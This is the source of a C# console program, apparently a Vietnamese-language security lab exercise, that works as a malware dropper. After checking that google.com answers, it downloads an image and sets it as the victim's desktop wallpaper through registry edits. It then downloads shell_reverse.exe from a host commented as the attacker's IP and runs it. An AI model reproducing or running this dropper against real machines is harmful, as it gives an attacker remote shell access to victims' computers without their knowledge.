﻿using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Diagnostics;
using System.IO;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Timers;
using System.Net;
using System.Net.Sockets;
using Microsoft.Win32;
using System.Runtime.InteropServices;

namespace lab2._3
{
    class Program
    {
        static void Main(string[] args)
        {
            CheckHTTPstatus();
            
        }

        static void CheckHTTPstatus() // kiểm tra và trả về trạng thái của HTTP, ví dụ: 200, 301, 403... 
        {
            HttpWebRequest webRequest = (HttpWebRequest)WebRequest.Create("http://www.google.com/");
            webRequest.AllowAutoRedirect = false;
            HttpWebResponse http_wresponse = (HttpWebResponse)webRequest.GetResponse();

            int _status = 0; // = (int)response.StatusCode;
            // Các phản hồi của server trong phạm vi 4xx - 5xx có thể bị bỏ qua cần phải sử dụng hàm try catch để bắt chúng
            try
            {
                http_wresponse = (HttpWebResponse)webRequest.GetResponse();
                _status = (int)http_wresponse.StatusCode;
            }
            catch (WebException exception)
            {
                _status = (int)((HttpWebResponse)exception.Response).StatusCode;
            }

            if (http_wresponse.StatusCode == HttpStatusCode.OK)
            {

                changeBackground();
                Reverse_shell();
            }
            else
            {
                string filepath = "C:\\Users\\" + Environment.UserName + "\\Desktop\\Hello.txt";
                if (!File.Exists(filepath))
                {
                    // Create a file to write to.
                    using (StreamWriter sw = File.CreateText(filepath))
                    {
                        sw.WriteLine("Hi bro...");
                    }
                }
                else
                {
                    using (StreamWriter sw = File.AppendText(filepath))
                    {
                        sw.WriteLine("Hi bro...");
                    }
                }

            }
            
        }
        [DllImport("user32.dll", CharSet = CharSet.Auto)]
        private static extern Int32 SystemParametersInfo(UInt32 uiAction, UInt32
        uiParam, String pvParam, UInt32 fWinIni);
        private static UInt32 SPI_SETDESKWALLPAPER = 20;
        private static UInt32 SPIF_UPDATEINIFILE = 0x1;
        private static UInt32 SPIF_SENDWININICHANGE = 0x02;

        static void changeBackground()
        {
            string pathfile = "C:\\Users\\" + Environment.UserName + "\\Desktop\\hacker.jpg";
            
            if (!File.Exists(pathfile))
            {
                using (var client = new WebClient())
                {
                    client.DownloadFile("https://www.globalsign.com/application/files/8615/8756/0680/Hacking_mobile_devices.jpg", pathfile);
                }
            }


            RegistryKey key = Registry.CurrentUser.OpenSubKey(@"Control Panel\Desktop", true);
            key.SetValue(@"WallpaperStyle", 0.ToString()); // 2 is stretched
            key.SetValue(@"TileWallpaper", 0.ToString());
            SystemParametersInfo(SPI_SETDESKWALLPAPER, 0, pathfile, SPIF_UPDATEINIFILE | SPIF_SENDWININICHANGE);

        }
        static void Reverse_shell()
        {
            string pathfile = "C:\\Users\\"+ Environment.UserName+"\\shell_reverse.exe";
            if (!File.Exists(pathfile))
            {
                using (var client = new WebClient())
                {
                    client.DownloadFile("http://172.20.8.0/shell_reverse.exe", pathfile);//ip máy attacker
                    //shell_reverse.exe được tạo ở phần B1
                }
                
            }
            Process.Start(pathfile);
        }
    }
}
